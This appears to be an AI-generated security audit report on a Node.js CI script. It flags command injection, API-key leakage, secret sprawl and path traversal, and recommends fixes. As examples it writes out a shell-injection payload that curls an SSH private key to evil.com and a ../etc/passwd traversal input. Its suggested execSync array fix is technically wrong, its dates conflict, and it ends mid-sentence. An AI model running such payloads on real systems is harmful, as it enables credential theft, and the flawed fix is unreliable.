# Security — Validation Report

> **Status:** PASS | **Model:** stepfun/step-3.5-flash:free | **Duration:** 28.6s
> **Files:** scripts/validation-orchestrator.mjs, scripts/lib/recursive-consensus.mjs
> **Generated:** 3/13/2026, 5:11:01 PM

---

# Security Audit Report: SwanStudios Validation Orchestrator

**Auditor:** Step 3.5 Flash (SWE-bench 74.4%)  
**Date:** 2025-10-18  
**Scope:** `scripts/validation-orchestrator.mjs`, `scripts/lib/recursive-consensus.mjs`  
**Context:** Dev/CI tooling for AI-assisted code validation — **not production runtime**, but handles API keys and executes shell commands.

---

## Executive Summary

| Category | Findings | Highest Severity |
|----------|----------|------------------|
| OWASP Top 10 | 2 | **HIGH** |
| Client-side Security | 1 | **MEDIUM** |
| Input Validation | 2 | **HIGH** |
| CORS & CSP | 0 | — |
| Authentication | 0 | — |
| Authorization | 0 | — |
| Data Exposure | 1 | **MEDIUM** |

**Overall Risk:** **MEDIUM** — Primary risk is command injection in the orchestrator script. This tool should only be run in trusted developer environments, but if an attacker can influence CLI arguments (e.g., via malicious git hook or CI/CD injection), they could achieve arbitrary command execution or read sensitive files.

---

## Detailed Findings

### 1. OWASP Top 10

#### A1: Injection (Command Injection)

**Severity:** HIGH  
**CWE:** CWE-78 (OS Command Injection)  
**Location:** `scripts/validation-orchestrator.mjs:156, 168, 172`  

```javascript
// Line 156
const out = execSync('git diff --cached --name-only', { cwd: ROOT, encoding: 'utf-8' });

// Line 168
const out = execSync(
  `git log ${timeArg} --diff-filter=ACMR --name-only --pretty=format:""`,
  { cwd: ROOT, encoding: 'utf-8' }
);

// Line 172
const out = execSync('git diff --name-only HEAD', { cwd: ROOT, encoding: 'utf-8' });
```

**Description:**  
The script uses `child_process.execSync()` to run git commands. The `timeArg` variable (line 168) is constructed from user-supplied `opts.since` input:

```javascript
const timeArg = `--since="${since}"`; // if regex fails
```

While there is a regex check (`/^(\d+)(h|d|m)$/`), the fallback path uses the raw `since` value without sanitization. An attacker who can control CLI arguments (e.g., via a malicious pre-commit hook or CI/CD parameter) could inject shell metacharacters:

```bash
node scripts/validation-orchestrator.mjs --since "2h; curl http://evil.com?steal=$(cat ~/.ssh/id_rsa)"
```

This would execute arbitrary commands on the host.

**Impact:**  
- Arbitrary command execution with privileges of the user running the script.
- Potential data exfiltration, credential theft, or supply-chain compromise.

**Recommendation:**  
- **Avoid `execSync` entirely** — use `git` commands via a library like `simple-git` or `isomorphic-git`, which accept arguments as arrays and avoid shell interpolation.
- If `execSync` must be used, **never interpolate user input into command strings**. Use array-based execution:

```javascript
// Instead of:
execSync(`git log ${timeArg} ...`);

// Use:
execSync('git', ['log', '--since=2h', '--diff-filter=ACMR', '--name-only', '--pretty=format:']);
```

- Validate `since` strictly: if regex fails, throw an error instead of using raw input.

---

#### A2: Broken Authentication (API Key Exposure)

**Severity:** MEDIUM  
**CWE:** CWE-200 (Exposure of Sensitive Information)  
**Location:** `scripts/validation-orchestrator.mjs:68-80, 257-262`  

**Description:**  
The script loads API keys from `.env` files and uses them to call external AI services. While keys are not logged by default, error handling could leak them:

```javascript
// Line 257-262
if (!res.ok) {
  const errBody = await res.text().catch(() => '');
  throw new Error(`OpenRouter ${res.status}: ${errBody.slice(0, 300)}`);
}
```

If the OpenRouter API returns a 401/403 error, `errBody` might contain the `Authorization` header or other sensitive data in the response (some APIs echo back request details). The error is thrown and could be caught and logged by the caller, exposing the API key in logs.

Similarly, the `callGeminiDirect` function (line 292) has the same pattern.

**Impact:**  
- API keys could be written to console logs, CI/CD logs, or error reporting services.
- Compromise of OpenRouter/Google AI keys, leading to unauthorized usage and potential cost accrual.

**Recommendation:**  
- **Never include response bodies in error messages** when they might contain request headers. Log only status codes and generic messages.
- Implement a sanitization step:

```javascript
if (!res.ok) {
  const errBody = await res.text().catch(() => '');
  // Redact any potential Authorization header echoes
  const sanitized = errBody.replace(/("Authorization"|"Bearer")[^,\n]*/gi, '"***** REDACTED *****"');
  throw new Error(`OpenRouter ${res.status}: ${sanitized.slice(0, 300)}`);
}
```

- Ensure top-level error handler (`main().catch`) does not print full error objects that might contain sensitive context.

---

### 2. Client-side Security

#### B1: Secrets in Logs / Reports

**Severity:** MEDIUM  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)  
**Location:** `scripts/validation-orchestrator.mjs:205-212, 405-408, 848-853`  

**Description:**  
The script bundles code files and sends them to AI models for analysis. The generated reports (written to `AI-Village-Documentation/validation-prompts/latest/`) contain:

- Full file contents (including any accidentally committed secrets: `.env` snippets, API keys, database URLs).
- AI responses that might quote or summarize sensitive code.
- Console logs that print file paths and durations.

If developers accidentally commit secrets to the repository, this tool will **propagate them into multiple markdown files** that could be read by other developers, CI systems, or accidentally committed themselves.

**Impact:**  
- Secret sprawl: credentials get duplicated into report files.
- Increased attack surface: secrets in logs may be collected by log aggregation services.

**Recommendation:**  
- **Pre-filter code bundles** to redact common secret patterns before sending to AI or writing to disk:

```javascript
function sanitizeCodeBundle(codeBundle) {
  return codeBundle.replace(
    /(OPENROUTER_API_KEY|GEMINI_API_KEY|DATABASE_URL|PASSWORD|SECRET)\s*=\s*[^\n]+/gi,
    '$1=***** REDACTED *****'
  );
}
```

- Apply this sanitization **before** creating `codeBundle` (line 212) and before writing any report files.
- Add a pre-commit hook to prevent committing files in `AI-Village-Documentation/` that contain patterns resembling secrets.

---

### 3. Input Validation

#### C1: Insufficient Path Validation (Path Traversal)

**Severity:** MEDIUM  
**CWE:** CWE-22 (Path Traversal)  
**Location:** `scripts/validation-orchestrator.mjs:153, 199-203`  

**Description:**  
User-supplied file paths (`opts.files`) are joined with `ROOT` and read without validation:

```javascript
const fullPath = join(ROOT, fp);
if (!existsSync(fullPath)) continue;
const content = readFileSync(fullPath, 'utf-8');
```

An attacker providing `--files ../../../../etc/passwd` could read arbitrary files on the host (if permissions allow). While this is a dev tool, in a CI/CD environment this could expose:

- Other projects' source code
- SSH keys (`~/.ssh/id_rsa`)
- CI/CD environment variables (often stored in files like `/run/secrets/...`)

**Impact:**  
- Unauthorized file read leading to disclosure of sensitive data.
- Potential escalation if CI runner has access to other repositories or secrets.

**Recommendation:**  
- **Validate all file paths** are within the repository root:

```javascript
function validatePath(fp) {
  const fullPath = join(ROOT, fp);
  const normalized = resolve(fullPath);
  if (!normalized.startsWith(ROOT)) {
    throw new Error(`Path traversal attempt blocked: ${fp}`);
  }
  return normalized;
}
```

- Use `fs.realpath` or `path.resolve` to canonicalize paths before checking.
- Reject absolute paths and `..` sequences.

---

#### C2: Weak Input Validation on `--since` Argument

**Severity:** HIGH  
**CWE:** CWE-20 (Improper Input Validation)  
**Location:** `scripts/validation-orchestrator.mjs:165-170`  

**Description:**  
The `--since` argument is partially validated by regex, but fallback uses

---

*Part of SwanStudios 9-Brain Recursive Consensus System*
